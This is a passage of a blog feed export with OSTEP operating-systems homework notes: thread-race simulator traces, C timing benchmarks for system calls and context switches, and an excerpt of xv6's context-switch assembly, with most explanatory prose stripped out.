class="string"><span class="meta">ARG memsize 128</span></span></span><br><span class="line"><span class="string"><span class="meta">ARG memtrace 2000</span></span></span><br><span class="line"><span class="string"><span class="meta">ARG regtrace</span></span></span><br><span class="line"><span class="string"><span class="meta">ARG cctrace False</span></span></span><br><span class="line"><span class="string"><span class="meta">ARG printstats False</span></span></span><br><span class="line"><span class="string"><span class="meta">ARG verbose False</span></span></span><br><span class="line"><span class="string"><span class="meta"></span></span></span><br><span class="line"><span class="string"><span class="meta"> 2000          Thread 0                Thread 1</span></span></span><br><span class="line"><span class="string"><span class="meta">    0</span></span></span><br><span class="line"><span class="string"><span class="meta">    0   1000 mov 2000, %ax</span></span></span><br><span class="line"><span class="string"><span class="meta">    0   ------ Interrupt ------  ------ Interrupt ------</span></span></span><br><span class="line"><span class="string"><span class="meta">    0                            1000 mov 2000, %ax</span></span></span><br><span class="line"><span class="string"><span class="meta">    0                            1001 add $1, %ax</span></span></span><br><span class="line"><span class="string"><span class="meta">    1                            1002 mov %ax, 2000</span></span></span><br><span class="line"><span class="string"><span class="meta">    1                            1003 sub  $1, %bx</span></span></span><br><span class="line"><span class="string"><span class="meta">    1   ------ Interrupt ------  ------ Interrupt ------</span></span></span><br><span class="line"><span class="string"><span class="meta">    1   1001 add $1, %ax</span></span></span><br><span class="line"><span class="string"><span class="meta">    1   1002 mov %ax, 2000</span></span></span><br><span class="line"><span class="string"><span class="meta">    1   1003 sub  $1, %bx</span></span></span><br><span class="line"><span class="string"><span class="meta">    1   1004 test $0, %bx</span></span></span><br><span class="line"><span class="string"><span class="meta">    1   ------ Interrupt ------  ------ Interrupt ------</span></span></span><br><span class="line"><span class="string"><span class="meta">    1                            1004 test $0, %bx</span></span></span><br><span class="line"><span class="string"><span class="meta">    1                            1005 jgt .top</span></span></span><br><span class="line"><span class="string"><span class="meta">    1   ------ Interrupt ------  ------ Interrupt ------</span></span></span><br><span class="line"><span class="string"><span class="meta">    1   1005 jgt .top</span></span></span><br><span class="line"><span class="string"><span class="meta">    1   1006 halt</span></span></span><br><span class="line"><span class="string"><span class="meta">    1   ----- Halt;Switch -----  ----- Halt;Switch -----</span></span></span><br><span class="line"><span class="string"><span class="meta">    1   ------ Interrupt ------  ------ Interrupt ------</span></span></span><br><span class="line"><span class="string"><span class="meta">    1                            1006 halt</span></span></span><br><span class="line"><span class="string"><span class="meta">grxer@grxer ~/D/s/O/o/threads-intro&gt; python ./x86.py -p looping-race-nolock.s -t 2 -M 2000  -i 4 -r -s 2 -c</span></span></span><br><span class="line"><span class="string"><span class="meta">ARG seed 2</span></span></span><br><span class="line"><span class="string"><span class="meta">ARG numthreads 2</span></span></span><br><span class="line"><span class="string"><span class="meta">ARG program looping-race-nolock.s</span></span></span><br><span class="line"><span class="string"><span class="meta">ARG interrupt frequency 4</span></span></span><br><span class="line"><span class="string"><span class="meta">ARG interrupt randomness True</span></span></span><br><span class="line"><span class="string"><span class="meta">ARG argv</span></span></span><br><span class="line"><span class="string"><span class="meta">ARG load address 1000</span></span></span><br><span class="line"><span class="string"><span class="meta">ARG memsize 128</span></span></span><br><span class="line"><span class="string"><span class="meta">ARG memtrace 2000</span></span></span><br><span class="line"><span class="string"><span class="meta">ARG regtrace</span></span></span><br><span class="line"><span class="string"><span class="meta">ARG cctrace False</span></span></span><br><span class="line"><span class="string"><span class="meta">ARG printstats False</span></span></span><br><span class="line"><span class="string"><span class="meta">ARG verbose False</span></span></span><br><span class="line"><span class="string"><span class="meta"></span></span></span><br><span class="line"><span class="string"><span class="meta"> 2000          Thread 0                Thread 1</span></span></span><br><span class="line"><span class="string"><span class="meta">    0</span></span></span><br><span class="line"><span class="string"><span class="meta">    0   1000 mov 2000, %ax</span></span></span><br><span class="line"><span class="string"><span class="meta">    0   1001 add $1, %ax</span></span></span><br><span class="line"><span class="string"><span class="meta">    1   1002 mov %ax, 2000</span></span></span><br><span class="line"><span class="string"><span class="meta">    1   1003 sub  $1, %bx</span></span></span><br><span class="line"><span class="string"><span class="meta">    1   ------ Interrupt ------  ------ Interrupt ------</span></span></span><br><span class="line"><span class="string"><span class="meta">    1                            1000 mov 2000, %ax</span></span></span><br><span class="line"><span class="string"><span class="meta">    1                            1001 add $1, %ax</span></span></span><br><span class="line"><span class="string"><span class="meta">    2                            1002 mov %ax, 2000</span></span></span><br><span class="line"><span class="string"><span class="meta">    2                            1003 sub  $1, %bx</span></span></span><br><span class="line"><span class="string"><span class="meta">    2   ------ Interrupt ------  ------ Interrupt ------</span></span></span><br><span class="line"><span class="string"><span class="meta">    2   1004 test $0, %bx</span></span></span><br><span class="line"><span class="string"><span class="meta">    2   ------ Interrupt ------  ------ Interrupt ------</span></span></span><br><span class="line"><span class="string"><span class="meta">    2                            1004 test $0, %bx</span></span></span><br><span class="line"><span class="string"><span class="meta">    2   ------ Interrupt ------  ------ Interrupt ------</span></span></span><br><span class="line"><span class="string"><span class="meta">    2   1005 jgt .top</span></span></span><br><span class="line"><span class="string"><span class="meta">    2   1006 halt</span></span></span><br><span class="line"><span class="string"><span class="meta">    2   ----- Halt;Switch -----  ----- Halt;Switch -----</span></span></span><br><span class="line"><span class="string"><span class="meta">    2                            1005 jgt .top</span></span></span><br><span class="line"><span class="string"><span class="meta">    2                            1006 halt</span></span></span><br></pre></td></tr></table></figure><p></p><ol start="7"><li></li></ol><p>-i 3</p><ol start="8"><li></li></ol><p></p><p>-i 597(100600)3</p><ol start="9"><li></li></ol><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">grxer@grxer ~/D/s/O/o/threads-intro&gt; cat wait-<span class="keyword">for</span>-me.s</span><br><span class="line">.main</span><br><span class="line">test $<span class="number">1</span>, %ax     <span class="meta"># ax should be 1 (signaller) or 0 (waiter)</span></span><br><span class="line">je .signaller</span><br><span class="line"></span><br><span class="line">.waiter</span><br><span class="line">mov  <span class="number">2000</span>, %cx</span><br><span class="line">test $<span class="number">1</span>, %cx</span><br><span class="line">jne .waiter</span><br><span class="line">halt</span><br><span class="line"></span><br><span class="line">.signaller</span><br><span class="line">mov  $<span class="number">1</span>, <span class="number">2000</span></span><br><span class="line">halt</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">grxer@grxer ~/D/s/O/o/threads-intro&gt; python ./x86.py -p wait-<span class="keyword">for</span>-me.s -a ax=<span class="number">1</span>,ax=<span class="number">0</span> -R ax,cx -M <span class="number">2000</span> -c</span><br><span class="line">ARG seed <span class="number">0</span></span><br><span class="line">ARG numthreads <span class="number">2</span></span><br><span class="line">ARG program wait-<span class="keyword">for</span>-me.s</span><br><span class="line">ARG interrupt frequency <span class="number">50</span></span><br><span class="line">ARG interrupt randomness False</span><br><span class="line">ARG argv ax=<span class="number">1</span>,ax=<span class="number">0</span></span><br><span class="line">ARG load address <span class="number">1000</span></span><br><span class="line">ARG memsize <span class="number">128</span></span><br><span class="line">ARG memtrace <span class="number">2000</span></span><br><span class="line">ARG regtrace ax,cx</span><br><span class="line">ARG cctrace False</span><br><span class="line">ARG printstats False</span><br><span class="line">ARG verbose False</span><br><span class="line"></span><br><span class="line"> <span class="number">2000</span>      ax    cx          Thread <span class="number">0</span>                Thread <span class="number">1</span></span><br><span class="line">    <span class="number">0</span>       <span class="number">1</span>     <span class="number">0</span></span><br><span class="line">    <span class="number">0</span>       <span class="number">1</span>     <span class="number">0</span>   <span class="number">1000</span> test $<span class="number">1</span>, %ax</span><br><span class="line">    <span class="number">0</span>       <span class="number">1</span>     <span class="number">0</span>   <span class="number">1001</span> je .signaller</span><br><span class="line">    <span class="number">1</span>       <span class="number">1</span>     <span class="number">0</span>   <span class="number">1006</span> mov  $<span class="number">1</span>, <span class="number">2000</span></span><br><span class="line">    <span class="number">1</span>       <span class="number">1</span>     <span class="number">0</span>   <span class="number">1007</span> halt</span><br><span class="line">    <span class="number">1</span>       <span class="number">0</span>     <span class="number">0</span>   ----- Halt;Switch -----  ----- Halt;Switch -----</span><br><span class="line">    <span class="number">1</span>       <span class="number">0</span>     <span class="number">0</span>                            <span class="number">1000</span> test $<span class="number">1</span>, %ax</span><br><span class="line">    <span class="number">1</span>       <span class="number">0</span>     <span class="number">0</span>                            <span class="number">1001</span> je .signaller</span><br><span class="line">    <span class="number">1</span>       <span class="number">0</span>     <span class="number">1</span>                            <span class="number">1002</span> mov  <span class="number">2000</span>, %cx</span><br><span class="line">    <span class="number">1</span>       <span class="number">0</span>     <span class="number">1</span>                            <span class="number">1003</span> test $<span class="number">1</span>, %cx</span><br><span class="line">    <span class="number">1</span>       <span class="number">0</span>     <span class="number">1</span>                            <span class="number">1004</span> jne .waiter</span><br><span class="line">    <span class="number">1</span>       <span class="number">0</span>     <span class="number">1</span>                            <span class="number">1005</span> halt</span><br></pre></td></tr></table></figure><ol start="10"><li></li></ol><p>01eax1</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">0</span>       <span class="number">0</span>     <span class="number">0</span>   <span class="number">1002</span> mov  <span class="number">2000</span>, %cx</span><br><span class="line"> <span class="number">0</span>       <span class="number">0</span>     <span class="number">0</span>   <span class="number">1003</span> test $<span class="number">1</span>, %cx</span><br><span class="line"> <span class="number">0</span>       <span class="number">1</span>     <span class="number">0</span>   ------ Interrupt ------  ------ Interrupt ------</span><br><span class="line"> <span class="number">0</span>       <span class="number">1</span>     <span class="number">0</span>                            <span class="number">1000</span> test $<span class="number">1</span>, %ax</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> OSTEP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>OSTEP:6 Mechanism:Limited Direct Execution Homework</title>
      <link href="/2023/04/15/OSTEP-homework-6-Mechanism-Limited-Direct-Execution/"/>
      <url>/2023/04/15/OSTEP-homework-6-Mechanism-Limited-Direct-Execution/</url>
      
        <content type="html"><![CDATA[<ol><li></li></ol><p>rdtsc(TSC64)32edx32rax</p><ul><li>CPU rdtsc </li><li></li><li>CPU TSC </li></ul><p>TSC<code> cat /proc/cpuinfo | grep constant_tsc</code></p><p>cpumemory barrier<code>mfence</code></p><p>rdtscp,<code>cat /proc/cpuinfo | grep rdtscp</code></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"> <span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">uint64_t</span> period = <span class="number">0</span>, period2 = <span class="number">0</span>;</span><br><span class="line">    <span class="type">uint64_t</span> low = <span class="number">0</span>, hight = <span class="number">0</span>,low2 = <span class="number">0</span>, hight2 = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> fd = open(<span class="string">&quot;./test.c&quot;</span>, O_RDWR);</span><br><span class="line">    assert(<span class="number">-1</span> != fd);</span><br><span class="line">    __asm__ <span class="title function_">volatile</span><span class="params">(<span class="string">&quot;rdtscp&quot;</span>:<span class="string">&quot;=a&quot;</span>(low), <span class="string">&quot;=d&quot;</span>(hight))</span>;</span><br><span class="line">    period = hight &lt;&lt; <span class="number">32</span> | low;</span><br><span class="line">    <span class="comment">// __asm__ __volatile__ (&quot;mfence&quot; : : : &quot;memory&quot;);//rdtscbarrier</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; <span class="number">1000000</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        read(fd, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// __asm__ __volatile__ (&quot;mfence&quot; : : : &quot;memory&quot;);</span></span><br><span class="line">    __asm__ <span class="title function_">volatile</span><span class="params">(<span class="string">&quot;rdtscp&quot;</span>:<span class="string">&quot;=a&quot;</span>(low), <span class="string">&quot;=d&quot;</span>(hight))</span>;</span><br><span class="line">    period2 = hight &lt;&lt; <span class="number">32</span> | low;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%lu\n&quot;</span>, period/<span class="number">1000000</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%lu\n&quot;</span>, period2/<span class="number">1000000</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%lu\n&quot;</span>, (period2 - period)/<span class="number">1000000</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;-----------&quot;</span>);</span><br><span class="line">    close(fd);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">grxer@grxer ~/D/s/O/o/<span class="number">6</span>&gt; <span class="keyword">while</span> <span class="literal">true</span> ;taskset -c <span class="number">1</span> sudo ./test;end</span><br><span class="line"><span class="number">35475179</span></span><br><span class="line"><span class="number">35475567</span></span><br><span class="line"><span class="number">387</span></span><br><span class="line">-----------</span><br><span class="line"><span class="number">35475595</span></span><br><span class="line"><span class="number">35475995</span></span><br><span class="line"><span class="number">399</span></span><br><span class="line">-----------</span><br><span class="line"><span class="number">35476026</span></span><br><span class="line"><span class="number">35476421</span></span><br><span class="line"><span class="number">395</span></span><br><span class="line">-----------</span><br><span class="line"><span class="number">35476449</span></span><br><span class="line"><span class="number">35476848</span></span><br><span class="line"><span class="number">399</span></span><br><span class="line">-----------</span><br><span class="line"><span class="number">35476881</span></span><br><span class="line"><span class="number">35477275</span></span><br><span class="line"><span class="number">393</span></span><br><span class="line">-----------</span><br><span class="line"><span class="number">35477304</span></span><br><span class="line"><span class="number">35477695</span></span><br><span class="line"><span class="number">390</span></span><br><span class="line">-----------</span><br><span class="line">^C </span><br></pre></td></tr></table></figure><p>clock_gettimegettimeofday,gettimeofdayclock_gettimebarrier</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> fd = open(<span class="string">&quot;./test.c&quot;</span>, O_RDWR);</span><br><span class="line">    assert(<span class="number">-1</span> != fd);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">timespec</span> <span class="title">start_time</span>, <span class="title">end_time</span>;</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    struct timespec &#123;</span></span><br><span class="line"><span class="comment">    time_t tv_sec;  // </span></span><br><span class="line"><span class="comment">    long tv_nsec;   // </span></span><br><span class="line"><span class="comment">    &#125;;</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    clock_gettime(CLOCK_MONOTONIC, &amp;start_time);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; <span class="number">1000000</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        read(fd, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    clock_gettime(CLOCK_MONOTONIC, &amp;end_time);</span><br><span class="line">    <span class="type">double</span> elapsed_time = (end_time.tv_sec * <span class="number">1e9</span> + end_time.tv_nsec - start_time.tv_sec * <span class="number">1e9</span> - start_time.tv_nsec)/<span class="number">1000000</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;ns:%f\n&quot;</span>, elapsed_time);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;us:%f\n&quot;</span>, elapsed_time / <span class="number">1000.0</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;ms:%f\n&quot;</span>, elapsed_time / <span class="number">1e6</span>);</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grxer@grxer ~/D/s/O/o/6 [SIGINT]&gt; gcc -g -o  test test.c</span><br><span class="line">grxer@grxer ~/D/s/O/o/6&gt; while true ;taskset -c 1 sudo ./test;end</span><br><span class="line">ns:127.141074</span><br><span class="line">us:0.127141</span><br><span class="line">ms:0.000127</span><br><span class="line">ns:127.567767</span><br><span class="line">us:0.127568</span><br><span class="line">ms:0.000128</span><br><span class="line">ns:126.079839</span><br><span class="line">us:0.126080</span><br><span class="line">ms:0.000126</span><br><span class="line">ns:127.143936</span><br><span class="line">us:0.127144</span><br><span class="line">ms:0.000127</span><br><span class="line">ns:126.850415</span><br><span class="line">us:0.126850</span><br><span class="line">ms:0.000127</span><br><span class="line">ns:121.985531</span><br><span class="line">us:0.121986</span><br><span class="line">ms:0.000122</span><br><span class="line">ns:119.445469</span><br><span class="line">us:0.119445</span><br><span class="line">ms:0.000119</span><br><span class="line">ns:119.942527</span><br><span class="line">us:0.119943</span><br><span class="line">ms:0.000120</span><br><span class="line">^C   </span><br></pre></td></tr></table></figure><p>cpu<code>cpu MHz         : 3193.924</code> 1 &#x2F; 3193.924MHz &#x3D; 0.312975 ns0.312975*395&#x3D;123.625125ns</p><p></p><ol start="2"><li></li></ol><p></p><p>cpu<code>sched_setaffinity</code>taskset(PS:forkcpu)</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE             <span class="comment">/* See feature_test_macros(7) */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">sched_setaffinity</span><span class="params">(<span class="type">pid_t</span> pid, <span class="type">size_t</span> cpusetsize,</span></span><br><span class="line"><span class="params">                      <span class="type">const</span> <span class="type">cpu_set_t</span> *mask)</span>;</span><br><span class="line">pid<span class="number">0</span>pid</span><br><span class="line">cpusetsize<span class="keyword">sizeof</span>(<span class="type">cpu_set_t</span>)</span><br><span class="line">mask CPU </span><br><span class="line">CPU_ZERO()CPU</span><br><span class="line"></span><br><span class="line">CPU_SET()cpu</span><br><span class="line"></span><br><span class="line">CPU_CLR()cpu</span><br><span class="line"></span><br><span class="line"><span class="title function_">CPU_ISSET</span><span class="params">()</span> cpu</span><br><span class="line"></span><br><span class="line"><span class="title function_">CPU_COUNT</span><span class="params">()</span>CPU</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE        </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span>   <span class="comment">// exit</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span> <span class="comment">// waitpid</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span>   <span class="comment">// fork, pipe, close, write, dup2</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">cpu_set_t</span> mask;</span><br><span class="line">    CPU_ZERO(&amp;mask);</span><br><span class="line">    CPU_SET(<span class="number">3</span>, &amp;mask);</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">2</span>];</span><br><span class="line">    <span class="type">pid_t</span> rc;</span><br><span class="line">    <span class="type">int</span> re = sched_setaffinity(<span class="number">0</span>, <span class="keyword">sizeof</span>(mask), &amp;mask);</span><br><span class="line">    <span class="keyword">if</span> (<span class="number">-1</span> == re) &#123;</span><br><span class="line">        perror(<span class="string">&quot;sched_setscheduler&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">int</span> pipefd1[<span class="number">2</span>], pipefd2[<span class="number">2</span>];</span><br><span class="line">    <span class="keyword">if</span> (pipe(pipefd1) &lt; <span class="number">0</span> || pipe(pipefd2) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;pipe&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;;</span><br><span class="line">    rc = fork();</span><br><span class="line">    <span class="keyword">if</span> (rc &lt; <span class="number">0</span>)</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (rc == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; <span class="number">1000000</span>; i++) &#123;</span><br><span class="line">            <span class="comment">// printf(&quot;----------------------%d\n&quot;, i);</span></span><br><span class="line">            read(pipefd1[<span class="number">0</span>], buf, <span class="number">1</span>);</span><br><span class="line">            write(pipefd2[<span class="number">1</span>], <span class="string">&quot;a&quot;</span>, <span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">struct</span> timespec start_time, end_time;</span><br><span class="line">        clock_gettime(CLOCK_MONOTONIC, &amp;start_time);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; <span class="number">1000000</span>; i++) &#123;</span><br><span class="line">            <span class="comment">// printf(&quot;+++++%d\n&quot;, i);</span></span><br><span class="line">            write(pipefd1[<span class="number">1</span>], <span class="string">&quot;0&quot;</span>, <span class="number">1</span>);</span><br><span class="line">            read(pipefd2[<span class="number">0</span>], buf, <span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        clock_gettime(CLOCK_MONOTONIC, &amp;end_time);</span><br><span class="line">        <span class="type">double</span> elapsed_time = (end_time.tv_sec * <span class="number">1e9</span> + end_time.tv_nsec - start_time.tv_sec * <span class="number">1e9</span> - start_time.tv_nsec) / <span class="number">1000000</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;ns:%f\n&quot;</span>, elapsed_time);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;us:%f\n&quot;</span>, elapsed_time / <span class="number">1000.0</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;ms:%f\n&quot;</span>, elapsed_time / <span class="number">1e6</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>cpu affinity8(100)cpu<code>    CPU_SET(3, &amp;mask);</code></p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grxer@grxer ~&gt; ps -a</span><br><span class="line">    PID TTY          TIME CMD</span><br><span class="line">   2677 pts/12   00:00:04 fish</span><br><span class="line">   8612 tty2     00:00:00 gnome-session-b</span><br><span class="line">   9251 pts/13   00:00:00 tmux: client</span><br><span class="line">   9276 pts/14   00:00:00 fish</span><br><span class="line">   9316 pts/15   00:00:00 fish</span><br><span class="line">  36681 pts/14   00:00:01 gdb</span><br><span class="line">  36697 pts/14   00:00:00 test &lt;defunct&gt;</span><br><span class="line">  48284 pts/23   00:00:00 fish</span><br><span class="line">  50253 pts/24   00:00:00 fish</span><br><span class="line">  54215 pts/38   00:00:02 2</span><br><span class="line">  54216 pts/38   00:00:02 2</span><br><span class="line">  54309 pts/24   00:00:00 ps</span><br><span class="line">grxer@grxer ~&gt; taskset -p 54216</span><br><span class="line">pid 54216&#x27;s current affinity mask: 8</span><br><span class="line">grxer@grxer ~&gt; taskset -p 54215</span><br><span class="line">pid 54215&#x27;s current affinity mask: 8</span><br></pre></td></tr></table></figure><p></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">grxer@grxer ~/D/s/O/o/<span class="number">6</span> [SIGINT]&gt; gcc -g -o <span class="number">2</span> <span class="number">2.</span>c</span><br><span class="line">grxer@grxer ~/D/s/O/o/<span class="number">6</span>&gt; ./<span class="number">2</span></span><br><span class="line">ns:<span class="number">4238.650005</span></span><br><span class="line">us:<span class="number">4.238650</span></span><br><span class="line">ms:<span class="number">0.004239</span></span><br></pre></td></tr></table></figure><p></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>OSTEP:6 Mechanism:Limited Direct Execution</title>
      <link href="/2023/04/13/OSTEP-6-Mechanism-Limited-Direct-Execution/"/>
      <url>/2023/04/13/OSTEP-6-Mechanism-Limited-Direct-Execution/</url>
      
        <content type="html"><![CDATA[<h1 id="Mechanism-Limited-Direct-Execution"><a href="#Mechanism-Limited-Direct-Execution" class="headerlink" title="Mechanism:Limited Direct Execution"></a>Mechanism:Limited Direct Execution</h1><h2 id=""><a href="#" class="headerlink" title=""></a></h2><p>cpu:</p><p>, x86-64 syscall</p><p>()<strong></strong>(321Gx86324KB8KB)</p><h2 id=""><a href="#" class="headerlink" title=""></a></h2><p> CPU </p><h3 id="-"><a href="#-" class="headerlink" title=":"></a>:</h3><p></p><h3 id=""><a href="#" class="headerlink" title=""></a></h3><p></p><p><strong></strong></p><h3 id=""><a href="#" class="headerlink" title=""></a></h3><p><strong></strong>Zzz</p><p>(context switch)</p><p>AB</p><p>Aswitch<strong>A</strong><strong>B</strong>BBBB</p><h4 id="xv6"><a href="#xv6" class="headerlink" title="xv6"></a>xv6</h4><p> <a href="https://github.com/mit-pdos/xv6-public">https://github.com/mit-pdos/xv6-public</a> </p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#   void swtch(struct context *old, struct context *new);</span><br><span class="line">#  </span><br><span class="line"># Save current register context in old</span><br><span class="line"># and then load register context from new.</span><br><span class="line"></span><br><span class="line">.globl swtch</span><br><span class="line">swtch:</span><br><span class="line">  # Save old registers</span><br><span class="line">  movl 4(%esp), %eax</span><br><span class="line"></span><br><span class="line">  popl 0(%eax)  # %eip</span><br><span class="line">  movl %esp, 4(%eax)</span><br><span class="line">  movl %ebx, 8(%eax)</span><br><span class="line">  movl %ecx, 12(%eax)</span><br><span class="line">  movl %edx, 16(%eax)</span><br><span class="line">  movl %esi, 20(%eax)</span><br><span class="line">  movl %edi, 24(%eax)</span><br><span class="line">  movl %ebp, 28(%eax)</span><br><span class="line"></span><br><span class="line">  # Load new registers</span><br><span class="line">  movl 4(%esp), %eax  # not 8(%esp) - popped return address above</span><br><span class="line"></span><br><span class="line">  movl 28(%eax), %ebp</span><br><span class="line">  movl 24(%eax), %edi</span><br><span class="line">  movl 20(%eax), %esi</span><br><span class="line">  movl 16(%eax), %edx</span><br><span class="line">  movl 12(%eax), %ecx</span><br><span class="line">  movl 8(%eax), %ebx</span><br><span class="line">  movl 4(%eax), %esp</span><br><span class="line">  pushl 0(%eax)  # %eip</span><br><span class="line"></span><br><span class="line">  ret</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Saved registers for kernel context switches.</span></span><br><span class="line"><span class="comment">// Don&#x27;t need to save all the %fs etc. segment registers,</span></span><br><span class="line"><span class="comment">// because they are constant across kernel contexts.</span></span><br><span class="line"><span class="comment">// Save all the regular registers so we don&#x27;t need to care</span></span><br><span class="line"><span class="comment">// which are caller save, but not the return register %eax.</span></span><br><span class="line"><span class="comment">// (Not saving %eax just simplifies the switching code.)</span></span><br><span class="line"><span class="comment">// The layout of context must match code in swtch.S.</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">context</span> &#123;</span></span><br><span class="line">  <span class="type">int</span> eip;</span><br><span class="line">  <span class="type">int</span> esp;</span><br><span class="line">  <span class="type">int</span> ebx;</span><br><span class="line">  <span class="type">int</span> ecx;</span><br><span class="line">  <span class="type">int</span> edx;</span><br><span class="line">  <span class="type">int</span> esi;</span><br><span class="line">  <span class="type">int</span> edi;</span><br><span class="line">  <span class="type">int</span> ebp;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>32</p><figure class="highlight tex"><table><tr><td class="code"><pre><span 